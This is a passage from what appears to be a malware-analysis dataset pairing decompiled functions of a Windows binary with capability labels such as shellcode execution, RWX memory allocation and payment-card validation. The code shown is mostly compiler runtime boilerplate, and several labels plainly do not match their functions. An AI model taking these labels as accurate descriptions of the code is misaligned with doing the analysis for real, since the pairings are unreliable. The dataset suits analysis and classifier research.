0xffffff00;\n                }\n                var_3ch = &fcn.00403030::lpAddress;\n                lpAddress = iVar3 + ((uVar9 - 0x400000) - iVar7);\n                *(&stack0xffffffa0 + iVar5) = 0x4032a7;\n                fcn.00402df0();\n            }\n            piVar10 = piVar10 + 3;\n        } while (piVar10 < 0x41779c);\n    }\n    else {\n        piVar6 = 0x417784;\ncode_r0x0040313e:\n        if (0x41779b < piVar6) {\n            *0x4182f0 = 0;\n            return;\n        }\n        var_3ch = &fcn.00403030::lpAddress;\n        do {\n            piVar10 = piVar6 + 2;\n            lpAddress = *(piVar6[1] + 0x400000) + *piVar6;\n            *(&stack0xffffffa0 + iVar5) = 0x403175;\n            fcn.00402df0();\n            piVar6 = piVar10;\n        } while (piVar10 < 0x41779c);\n    }\n    iVar5 = 0;\n    if (0 < *0x4182f0) {\n        do {\n            puVar4 = var_3ch;\n            piVar6 = *0x4182f4 + iVar5 * 0xc;\n            if (*piVar6 != 0) {\n                piVar13[2] = 0x1c;\n                piVar13[1] = puVar4;\n                *piVar13 = piVar6[1];\n                piVar11 = piVar13 + -1;\n                piVar13[-1] = 0x4031cd;\n                iVar7 = (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n                ppcVar14 = piVar11 + -3;\n                if (iVar7 == 0) {\n                    iVar5 = *0x4182f4 + iVar5 * 0xc;\n                    piVar11[-1] = *(iVar5 + 4);\n                    iVar5 = *(*(iVar5 + 8) + 8);\n                    piVar11[-3] = \"  VirtualQuery failed for %d bytes at address %p\";\n                    piVar11[-2] = iVar5;\n                    piVar11[-4] = 0x4032f3;\n                    pcVar8 = fcn.00402d90();\n                    goto code_r0x004032f3;\n                }\n                *piVar11 = &fcn.00403030::var_38h;\n                piVar11[-1] = *(*0x4182f4 + iVar5 * 0xc);\n                piVar11[-2] = var_28h;\n                piVar11[-3] = lpAddress;\n                piVar12 = piVar11 + -4;\n                piVar11[-4] = 0x4031fe;\n                (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n                piVar13 = piVar12 + -0x10;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < *0x4182f0);\n    }\n    return;\n}\n",
        "token_count": 1773
    },
    "004036b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004036b0(uint noname_0, int32_t arg_ch)\n\n{\n    if (arg_ch != 1) {\n        if (arg_ch == 0) {\n            if (*0x418644 != 0) {\n                fcn.00403500();\n            }\n            if (*0x418644 == 1) {\n                *0x418644 = 0;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x418648);\n            }\n        }\n        else if ((arg_ch == 3) && (*0x418644 != 0)) {\n            fcn.00403500();\n        }\n        return 1;\n    }\n    if (*0x418644 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x418648);\n    }\n    *0x418644 = 1;\n    return 1;\n}\n",
        "token_count": 195
    },
    "004033c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.004033c0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t lpSystemTimeAsFileTime;\n    uint32_t var_24h;\n    uint32_t lpPerformanceCount;\n    uint32_t var_1ch;\n    uint var_ch;\n    \n    lpSystemTimeAsFileTime = 0;\n    var_24h = 0;\n    if (*0x40402c != 0xbb40e64e) {\n        *0x404030 = ~*0x40402c;\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&lpSystemTimeAsFileTime);\n    uVar4 = lpSystemTimeAsFileTime ^ var_24h;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(&lpPerformanceCount);\n    *0x40402c = uVar4 ^ lpPerformanceCount ^ var_1ch ^ uVar1 ^ uVar2 ^ uVar3;\n    if (*0x40402c == 0xbb40e64e) {\n        *0x404030 = 0x44bf19b0;\n        *0x40402c = 0xbb40e64f;\n    }\n    else {\n        *0x404030 = ~*0x40402c;\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "00403470": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00403470(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint arg_4h, uint arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_retaddr;\n    uint var_10h;\n    uint var_ch;\n    \n    *0x4185e0 = 0xc0000409;\n    *0x4185e4 = 1;\n    *0x4183ac = noname_0;\n    *0x4183b8 = unaff_retaddr;\n    *0x4183c4 = *0x10;\n    *0x4185ec = unaff_retaddr;\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x417510);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar3, 0xc0000409);\n    sub.msvcrt.dll_abort();\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x418648);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x418640; puVar1 != NULL; puVar1 = puVar1[2]) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*puVar1);\n        iVar5 = (*pcVar2)();\n        if ((iVar5 == 0) && (iVar4 != 0)) {\n            (*puVar1[1])(iVar4);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x418648);\n    return;\n}\n",
        "token_count": 478
    },
    "00403500": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00403500(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x418648);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x418640; puVar1 != NULL; puVar1 = puVar1[2]) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar3 != 0)) {\n            (*puVar1[1])(iVar3);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x418648);\n    return;\n}\n",
        "token_count": 205
    },
    "00403580": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.00403580(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_8h;\n    \n    uVar2 = 0;\n    if (*0x418644 != 0) {\n        puVar1 = sub.msvcrt.dll_calloc(1, 0xc);\n        if (puVar1 != NULL) {\n            *puVar1 = arg_8h;\n            puVar1[1] = arg_ch;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x418648);\n            puVar1[2] = *0x418640;\n            *0x418640 = puVar1;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x418648);\n            return 0;\n        }\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 214
    },
    "00403610": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00403610(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint var_4h;\n    \n    if (*0x418644 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x418648);\n    if (*0x418640 == NULL) {\ncode_r0x00403661:\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x418648);\n    }\n    else {\n        piVar1 = *0x418640;\n        if (**0x418640 == arg_8h) {\n            *0x418640 = (*0x418640)[2];\n        }\n        else {\n            do {\n                piVar2 = piVar1;\n                piVar1 = piVar2[2];\n                if (piVar1 == NULL) goto code_r0x00403661;\n            } while (*piVar1 != arg_8h);\n            piVar2[2] = piVar1[2];\n        }\n        sub.msvcrt.dll_free(piVar1);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x418648);\n    }\n    return 0;\n}\n",
        "token_count": 291
    },
    "00402a90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00402a90(uint param_1)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    uint auStack16 [3];\n    \n    iStack20 = fcn.00402a70(*0x418674);\n    if (iStack20 != -1) {\n        sub.msvcrt.dll__lock(8);\n        iStack20 = fcn.00402a70(*0x418674);\n        auStack16[0] = fcn.00402a70(*0x418670);\n        uVar1 = sub.msvcrt.dll___dllonexit(param_1, &iStack20, auStack16);\n        *0x418674 = fcn.00402a80(iStack20);\n        *0x418670 = fcn.00402a80(auStack16[0]);\n        sub.msvcrt.dll__unlock(8);\n        return uVar1;\n    }\n    uVar1 = (*_sym.imp.msvcrt.dll__onexit)(param_1);\n    return uVar1;\n}\n",
        "token_count": 230
    },
    "004033a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004033a0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x4182f8 != 0) {\n        return;\n    }\n    *0x4182f8 = 1;\n    iVar2 = *0x403c00;\n    if (*0x403c00 == -1) {\n        iVar1 = 0;\n        do {\n            iVar2 = iVar1;\n            iVar1 = iVar2 + 1;\n        } while (*((iVar2 + 1) * 4 + 0x403c00) != 0);\n    }\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        (**(iVar2 * 4 + 0x403c00))();\n    }\n    fcn.00402b50(0x403320);\n    return;\n}\n",
        "token_count": 192
    },
    "00401b00": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401b00(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if (arg_ch == 0x10) {\n        (*_sym.imp.USER32.dll_EndDialog)(arg_8h, 0);\n        return 1;\n    }\n    if (arg_ch != 0x205) {\n        return 0;\n    }\n    cVar1 = fcn.00401a40(arg_8h);\n    if (cVar1 == '\\0') {\n        pcVar2 = \"No Selection\";\n    }\n    else {\n        pcVar2 = 0x4181a0;\n    }\n    (*_sym.imp.USER32.dll_SetWindowTextA)(arg_8h, pcVar2);\n    return 1;\n}\n",
        "token_count": 179
    },
    "00402df0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403203)\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __fastcall fcn.00402df0(uint param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uchar *puVar5;\n    uint32_t in_EAX;\n    int32_t *piVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    int32_t *piVar15;\n    char **ppcVar16;\n    uint uStack188;\n    char *pcStack184;\n    uint32_t auStack180 [6];\n    uint uStack156;\n    uchar auStack152 [4];\n    int32_t iStack148;\n    int32_t iStack136;\n    uint uStack112;\n    code *pcStack108;\n    uint uStack104;\n    int32_t iStack100;\n    uint *puStack96;\n    char *pcStack92;\n    uint *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint *var_48h;\n    uint *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint lpAddress;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_bp_ch;\n    \n    var_40h = param_1;\n    var_3ch = param_2;\n    if (*0x4182f0 < 1) goto code_r0x00402fe0;\n    pcStack108 = NULL;\n    iVar10 = *0x4182f4;\n    do {\n        if ((*(iVar10 + 4) <= in_EAX) && (iStack100 = *(iVar10 + 8),  in_EAX < *(iVar10 + 4) + *(iStack100 + 8))) {\n            puVar11 = &fcn.00402df0::lpAddress;\n            pcStack108 = _sym.imp.KERNEL32.dll_VirtualQuery;\n            goto code_r0x00402eba;\n        }\n        pcStack108 = pcStack108 + 1;\n        iVar10 = iVar10 + 0xc;\n    } while (pcStack108 != *0x4182f0);\n    while( true ) {\n        puStack96 = 0x402e3e;\n        iStack100 = fcn.00403870();\n        if (iStack100 == 0) break;\n        var_44h = pcStack108 * 0xc;\n        puVar11 = var_44h + *0x4182f4;\n        puVar11[2] = iStack100;\n        *puVar11 = 0;\n        puStack96 = 0x402e67;\n        iVar10 = fcn.00403960();\n        puStack88 = &fcn.00402df0::lpAddress;\n        puVar11[1] = iVar10 + *(iStack100 + 0xc);\n        pcStack108 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        uStack84 = 0x1c;\n        pcStack92 = *(*0x4182f4 + 4 + var_44h);\n        puStack96 = 0x402e96;\n        var_48h = puStack88;\n        iVar10 = (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n        if (iVar10 == 0) {\n            uStack84 = *(*0x4182f4 + 4 + var_44h);\n            puStack88 = *(iStack100 + 8);\n            pcStack92 = \"  VirtualQuery failed for %d bytes at address %p\";\n            puStack96 = 0x403007;\n            fcn.00402d90();\n            break;\n        }\n        puVar11 = var_48h;\n        if ((var_20h == 4) || (var_20h == 0x40)) {\ncode_r0x00402eb3:\n            *0x4182f0 = *0x4182f0 + 1;\ncode_r0x00402eba:\n            uStack84 = 0x1c;\n            puStack96 = 0x402ecb;\n            puStack88 = puVar11;\n            iVar10 = (*pcStack108)();\n            pcVar4 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            if (iVar10 != 0) {\n                if ((var_20h == 4) || (var_20h == 0x40)) {\n                    uStack84 = var_40h;\n                    puStack88 = var_3ch;\n                    puStack96 = 0x402ef4;\n                    sub.msvcrt.dll_memcpy();\n                }\n                else {\n                    uStack84 = 0x40;\n                    puStack88 = var_28h;\n                    pcStack92 = lpAddress;\n                    puStack96 = 0x402f39;\n                    puStack80 = &fcn.00402df0::var_38h;\n                    (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n                    iStack100 = var_40h;\n                    uStack104 = var_3ch;\n                    uStack112 = 0x402f52;\n                    sub.msvcrt.dll_memcpy();\n                    if ((var_20h != 0x40) && (var_20h != 4)) {\n                        iStack100 = var_38h;\n                        uStack104 = var_28h;\n                        pcStack108 = lpAddress;\n                        uStack112 = 0x402f79;\n                        puStack96 = &fcn.00402df0::var_38h;\n                        (*pcVar4)();\n                        return;\n                    }\n                }\n                return;\n            }\n            goto code_r0x00403017;\n        }\n        puStack80 = var_44h + *0x4182f4;\n        var_44h = var_48h;\n        uStack84 = 0x40;\n        puStack88 = var_28h;\n        pcStack92 = lpAddress;\n        puStack96 = 0x402fb5;\n        iVar10 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        puVar11 = var_44h;\n        if (iVar10 != 0) goto code_r0x00402eb3;\n        puStack96 = 0x402fc9;\n        puStack88 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        pcStack92 = \"  VirtualProtect failed with code 0x%x\";\n        puStack96 = 0x402fd9;\n        fcn.00402d90();\ncode_r0x00402fe0:\n        pcStack108 = NULL;\n    }\n    pcStack92 = \"Address %p has no image-section\";\n    puStack96 = 0x403017;\n    fcn.00402d90();\ncode_r0x00403017:\n    puStack88 = 0x1c;\n    pcStack92 = \"  VirtualQuery failed for %d bytes at address %p\";\n    puStack96 = 0x40302f;\n    fcn.00402d90();\n    if (*0x4182ec != 0) {\n        return;\n    }\n    *0x4182ec = 1;\n    uStack188 = 0x403058;\n    puStack96 = &stack0xfffffffc;\n    fcn.004038c0();\n    uStack188 = 0x40306a;\n    iVar10 = fcn.00403a90();\n    *0x4182f0 = NULL;\n    iVar10 = -iVar10;\n    ppcVar16 = &stack0xffffff48 + iVar10;\n    piVar15 = &stack0xffffff48 + iVar10;\n    *0x4182f4 = &stack0xffffff67 + iVar10 & 0xfffffff0;\n    if ((*0x417784 == 0) && (*0x417788 == 0)) {\n        piVar12 = 0x417790;\n        if (*0x41778c == 0) {\n            piVar6 = piVar12;\n            if ((*0x417790 != 0) || (piVar6 = 0x417790,  *0x417794 != 0)) goto code_r0x0040313e;\n        }\n        else {\n            piVar12 = 0x417784;\n        }\n        pcVar8 = piVar12[2];\n        if (pcVar8 != 0x1) {\ncode_r0x004032f3:\n            ppcVar16[1] = pcVar8;\n            *ppcVar16 = \"  Unknown pseudo relocation protocol version %d.\\n\";\n            ppcVar16[-1] = 0x403303;\n            fcn.00402d90();\n            return;\n        }\n        piVar12 = piVar12 + 3;\n        if (0x41779b < piVar12) {\n            *0x4182f0 = NULL;\n            return;\n        }\n        do {\n            iVar7 = *piVar12;\n            iVar3 = *(iVar7 + 0x400000);\n            piVar6 = piVar12[1] + 0x400000;\n            uStack156 = iVar3;\n            uVar9 = *(piVar12 + 2);\n            if (uVar9 == 0x10) {\n                uVar2 = *(piVar12[1] + 0x400000);\n                uVar9 = uVar2;\n                if (uVar2 < 0) {\n                    uVar9 = uVar2 | 0xffff0000;\n                }\n                uStack156 = &stack0xffffff6c;\n                iStack148 = iVar3 + (uVar9 - iVar7) + -0x400000;\n                *(&stack0xffffff44 + iVar10) = 0x40325d;\n                fcn.00402df0();\n            }\n            else if (uVar9 == 0x20) {\n                uStack156 = &stack0xffffff6c;\n                iStack148 = (iVar3 - (iVar7 + 0x400000)) + *piVar6;\n                *(&stack0xffffff44 + iVar10) = 0x4032cc;\n                fcn.00402df0();\n            }\n            else {\n                if (uVar9 != 8) {\n                    *(&stack0xffffff4c + iVar10) = uVar9;\n                    *(&stack0xffffff48 + iVar10) = \"  Unknown pseudo relocation bit size %d.\\n\";\n                    iStack148 = 0;\n                    *(&stack0xffffff44 + iVar10) = 0x403131;\n                    fcn.00402d90();\n                    return;\n                }\n                uVar1 = *piVar6;\n                uVar9 = uVar1;\n                if (uVar1 < '\\0') {\n                    uVar9 = uVar1 | 0xffffff00;\n                }\n                uStack156 = &stack0xffffff6c;\n                iStack148 = iVar3 + ((uVar9 - 0x400000) - iVar7);\n                *(&stack0xffffff44 + iVar10) = 0x4032a7;\n                fcn.00402df0();\n            }\n            piVar12 = piVar12 + 3;\n        } while (piVar12 < 0x41779c);\n    }\n    else {\n        piVar6 = 0x417784;\ncode_r0x0040313e:\n        if (0x41779b < piVar6) {\n            *0x4182f0 = NULL;\n            return;\n        }\n        uStack156 = &stack0xffffff6c;\n        do {\n            piVar12 = piVar6 + 2;\n            iStack148 = *(piVar6[1] + 0x400000) + *piVar6;\n            *(&stack0xffffff44 + iVar10) = 0x403175;\n            fcn.00402df0();\n            piVar6 = piVar12;\n        } while (piVar12 < 0x41779c);\n    }\n    iVar10 = 0;\n    if (0 < *0x4182f0) {\n        do {\n            puVar5 = uStack156;\n            piVar6 = *0x4182f4 + iVar10 * 0xc;\n            if (*piVar6 != 0) {\n                piVar15[2] = 0x1c;\n                piVar15[1] = puVar5;\n                *piVar15 = piVar6[1];\n                piVar13 = piVar15 + -1;\n                piVar15[-1] = 0x4031cd;\n                iVar7 = (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n                ppcVar16 = piVar13 + -3;\n                if (iVar7 == 0) {\n                    iVar10 = *0x4182f4 + iVar10 * 0xc;\n                    piVar13[-1] = *(iVar10 + 4);\n                    iVar10 = *(*(iVar10 + 8) + 8);\n                    piVar13[-3] = \"  VirtualQuery failed for %d bytes at address %p\";\n                    piVar13[-2] = iVar10;\n                    piVar13[-4] = 0x4032f3;\n                    pcVar8 = fcn.00402d90();\n                    goto code_r0x004032f3;\n                }\n                *piVar13 = &stack0xffffff68;\n                piVar13[-1] = *(*0x4182f4 + iVar10 * 0xc);\n                piVar13[-2] = iStack136;\n                piVar13[-3] = iStack148;\n                piVar14 = piVar13 + -4;\n                piVar13[-4] = 0x4031fe;\n                (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n                piVar15 = piVar14 + -0x10;\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < *0x4182f0);\n    }\n    return;\n}\n",
        "token_count": 3146
    },
    "00403870": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.00403870(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x400000 == 0x5a4d) {\n        iVar1 = fcn.00403750();\n        if (iVar1 != 0) {\n            uVar2 = fcn.00403790(0x400000, param_1 + -0x400000);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 111
    },
    "00403a90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.00403a90(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uStack8;\n    \n    puVar2 = &stack0x00000004;\n    uVar1 = in_EAX;\n    if (0xfff < in_EAX) {\n        do {\n            puVar2 = puVar2 + -0x400;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack8 = in_EAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack8;\n}\n",
        "token_count": 173
    },
    "00402240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402240(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uchar auStack1060 [1044];\n    \n    iVar1 = sub.msvcrt.dll_strlen();\n    uVar2 = sub.msvcrt.dll_malloc(iVar1 + 1);\n    sub.msvcrt.dll_memset(uVar2, 0, iVar1 + 1);\n    fcn.00401c50(auStack1060, param_2, 0x405090);\n    fcn.00401ea0(auStack1060, iVar1);\n    return uVar2;\n}\n",
        "token_count": 143
    },
    "00402b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402b50(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402a90(param_1);\n    return -(iVar1 == 0);\n}\n",
        "token_count": 50
    },
    "00402d90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403203)\n\nvoid fcn.00402d90(void)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    uint extraout_ECX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    char **ppcVar15;\n    ulong uVar16;\n    uint uStack216;\n    char *pcStack212;\n    uint32_t auStack208 [6];\n    uint uStack184;\n    uchar auStack180 [4];\n    int32_t aiStack176 [3];\n    int32_t iStack164;\n    uint uStack140;\n    code *pcStack136;\n    uint32_t uStack132;\n    int32_t iStack128;\n    uint *puStack124;\n    char *pcStack120;\n    uint *puStack116;\n    uint32_t uStack112;\n    uint *puStack108;\n    uint *puStack104;\n    uint *puStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint auStack84 [3];\n    uint uStack72;\n    int32_t iStack64;\n    uchar *puStack44;\n    \n    puStack44 = &stack0x00000008;\n    sub.msvcrt.dll_fwrite();\n    sub.msvcrt.dll_vfprintf();\n    uVar16 = sub.msvcrt.dll_abort();\n    uStack92 = uVar16 >> 0x20;\n    uVar7 = uVar16;\n    uStack96 = extraout_ECX;\n    if (*0x4182f0 < 1) goto code_r0x00402fe0;\n    pcStack136 = NULL;\n    iVar8 = *0x4182f4;\n    do {\n        if ((*(iVar8 + 4) <= uVar7) && (iStack128 = *(iVar8 + 8),  uVar7 < *(iVar8 + 4) + *(iStack128 + 8))) {\n            puVar9 = auStack84;\n            pcStack136 = _sym.imp.KERNEL32.dll_VirtualQuery;\n            goto code_r0x00402eba;\n        }\n        pcStack136 = pcStack136 + 1;\n        iVar8 = iVar8 + 0xc;\n    } while (pcStack136 != *0x4182f0);\n    while( true ) {\n        puStack124 = 0x402e3e;\n        pcStack120 = uVar7;\n        iStack128 = fcn.00403870();\n        if (iStack128 == 0) break;\n        puStack100 = pcStack136 * 0xc;\n        puVar9 = puStack100 + *0x4182f4;\n        puVar9[2] = iStack128;\n        *puVar9 = 0;\n        puStack124 = 0x402e67;\n        iVar8 = fcn.00403960();\n        puStack116 = auStack84;\n        puVar9[1] = iVar8 + *(iStack128 + 0xc);\n        pcStack136 = _sym.imp.KERNEL32.dll_VirtualQuery;\n        uStack112 = 0x1c;\n        pcStack120 = *(*0x4182f4 + 4 + puStack100);\n        puStack124 = 0x402e96;\n        puStack104 = puStack116;\n        iVar8 = (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n        if (iVar8 == 0) {\n            uStack112 = *(*0x4182f4 + 4 + puStack100);\n            puStack116 = *(iStack128 + 8);\n            pcStack120 = \"  VirtualQuery failed for %d bytes at address %p\";\n            puStack124 = 0x403007;\n            fcn.00402d90();\n            break;\n        }\n        puVar9 = puStack104;\n        if ((iStack64 == 4) || (iStack64 == 0x40)) {\ncode_r0x00402eb3:\n            *0x4182f0 = *0x4182f0 + 1;\ncode_r0x00402eba:\n            uStack112 = 0x1c;\n            puStack124 = 0x402ecb;\n            pcStack120 = uVar7;\n            puStack116 = puVar9;\n            iVar8 = (*pcStack136)();\n            pcVar4 = _sym.imp.KERNEL32.dll_VirtualProtect;\n            if (iVar8 != 0) {\n                if ((iStack64 == 4) || (iStack64 == 0x40)) {\n                    uStack112 = uStack96;\n                    puStack116 = uStack92;\n                    puStack124 = 0x402ef4;\n                    pcStack120 = uVar7;\n                    sub.msvcrt.dll_memcpy();\n                }\n                else {\n                    uStack112 = 0x40;\n                    puStack116 = uStack72;\n                    pcStack120 = auStack84[0];\n                    puStack124 = 0x402f39;\n                    puStack108 = &uStack88;\n                    (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n                    iStack128 = uStack96;\n                    uStack132 = uStack92;\n                    uStack140 = 0x402f52;\n                    pcStack136 = uVar7;\n                    sub.msvcrt.dll_memcpy();\n                    if ((iStack64 != 0x40) && (iStack64 != 4)) {\n                        iStack128 = uStack88;\n                        uStack132 = uStack72;\n                        pcStack136 = auStack84[0];\n                        uStack140 = 0x402f79;\n                        puStack124 = &uStack88;\n                        (*pcVar4)();\n                        return;\n                    }\n                }\n                return;\n            }\n            goto code_r0x00403017;\n        }\n        puStack108 = puStack100 + *0x4182f4;\n        puStack100 = puStack104;\n        uStack112 = 0x40;\n        puStack116 = uStack72;\n        pcStack120 = auStack84[0];\n        puStack124 = 0x402fb5;\n        iVar8 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        puVar9 = puStack100;\n        if (iVar8 != 0) goto code_r0x00402eb3;\n        puStack124 = 0x402fc9;\n        puStack116 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        pcStack120 = \"  VirtualProtect failed with code 0x%x\";\n        puStack124 = 0x402fd9;\n        fcn.00402d90();\ncode_r0x00402fe0:\n        pcStack136 = NULL;\n    }\n    pcStack120 = \"Address %p has no image-section\";\n    puStack124 = 0x403017;\n    puStack116 = uVar7;\n    fcn.00402d90();\ncode_r0x00403017:\n    puStack116 = 0x1c;\n    pcStack120 = \"  VirtualQuery failed for %d bytes at address %p\";\n    puStack124 = 0x40302f;\n    uStack112 = uVar7;\n    fcn.00402d90();\n    if (*0x4182ec != 0) {\n        return;\n    }\n    *0x4182ec = 1;\n    uStack216 = 0x403058;\n    uStack132 = uVar7;\n    puStack124 = &stack0xffffffe0;\n    fcn.004038c0();\n    uStack216 = 0x40306a;\n    iVar8 = fcn.00403a90();\n    *0x4182f0 = NULL;\n    iVar8 = -iVar8;\n    ppcVar15 = &pcStack212 + iVar8;\n    piVar14 = &pcStack212 + iVar8;\n    *0x4182f4 = auStack180 + iVar8 + -1 & 0xfffffff0;\n    if ((*0x417784 == 0) && (*0x417788 == 